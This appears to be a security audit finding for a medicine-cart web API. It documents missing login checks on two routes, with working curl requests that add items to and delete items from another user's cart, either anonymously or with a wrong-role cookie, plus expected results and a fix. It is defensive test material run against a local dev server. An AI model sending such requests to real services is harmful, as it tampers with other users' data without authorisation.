# V-12 — Two of the three cart routes have no login check

**Finding:** the login middleware is imported in the cart routes file but applied
to only **one** of the three routes. Adding to and deleting from *any* cart needs
no login at all, and the add route does not check the caller's role either.
OWASP A01:2025 (Broken Access Control), CWE-306.
📍 [UserCart.routes.js](../../backend/src/routes/UserCart.routes.js)

```js
router.post("/add-to-cart", ToggleCart);                                // ← no guard
router.delete("/delete-from-cart/:id", deleteFromCart);                 // ← no guard
router.get("/user-cart/:userId", isPatientAuthenticated, getUserCart);  // ← guarded
```

## Setup

```bash
# Terminal 1
cd backend && npm run dev:test

# Terminal 2 — from the repo root
tok() { node -p "const t=require('./security-tests/.tokens.json'); $1"; }
BASE=$(tok "t.baseUrl")
BOBBY=$(tok "t.accounts.bobby.cookie"); BOBBY_ID=$(tok "t.accounts.bobby.id")
ALPHA=$(tok "t.accounts.alpha.cookie")                 # a DOCTOR cookie, wrong role
CART_ID=$(tok "t.ids.cartId")                          # Bobby's seeded cart row
MED2=$(node -p "require('crypto').randomBytes(12).toString('hex')")   # anon add
MED4=$(node -p "require('crypto').randomBytes(12).toString('hex')")   # wrong-role add
```

## Attacks

### Control — the one guarded route, no cookie (this SHOULD be refused)
```bash
curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$BOBBY_ID"
```

### Attack 1 — add an item to Bobby's cart, no cookie
```bash
curl -s -i -X POST "$BASE/api/v1/medicines-cart/add-to-cart" \
  -H "Content-Type: application/json" \
  -d "{\"userId\":\"$BOBBY_ID\",\"medicineId\":\"$MED2\",\"quantity\":5,\"totalPrice\":500,\"status\":\"Pending\"}"
```

### Attack 2 — delete Bobby's seeded cart row, no cookie
```bash
curl -s -i -X DELETE "$BASE/api/v1/medicines-cart/delete-from-cart/$CART_ID"
```

### Attack 3 — add to Bobby's cart with a doctor's cookie (wrong role)
```bash
curl -s -i -X POST "$BASE/api/v1/medicines-cart/add-to-cart" \
  -H "Cookie: $ALPHA" -H "Content-Type: application/json" \
  -d "{\"userId\":\"$BOBBY_ID\",\"medicineId\":\"$MED4\",\"quantity\":1,\"totalPrice\":999,\"status\":\"Pending\"}"
```

### Confirm — Bobby logs in and looks at his own cart
```bash
curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$BOBBY_ID" -H "Cookie: $BOBBY"
```

## Expected result

| | Before the fix | After the fix |
|---|---|---|
| Control (guarded GET, no cookie) | `HTTP 401` | `HTTP 401` (unchanged) |
| Attack 1 (anon add) | `HTTP 201`, row created | `HTTP 401` |
| Attack 2 (anon delete) | `HTTP 200`, seeded row deleted | `HTTP 401` |
| Attack 3 (doctor cookie add) | `HTTP 201`, row created | `HTTP 401`/`403` |
| Confirm | anon + doctor rows present, seeded row gone | Bobby's cart unchanged |

## How to fix

Apply `isPatientAuthenticated` to **all three** routes. Take `userId` from the
verified session (`req.user._id`), not from the body — see V-13.

## Re-run for "after" evidence

```bash
# restart the dev server first (the attacks change the seed)
node security-tests/capture-v11-v15.mjs --after
bash security-tests/curl-v11-v15.sh --after
```
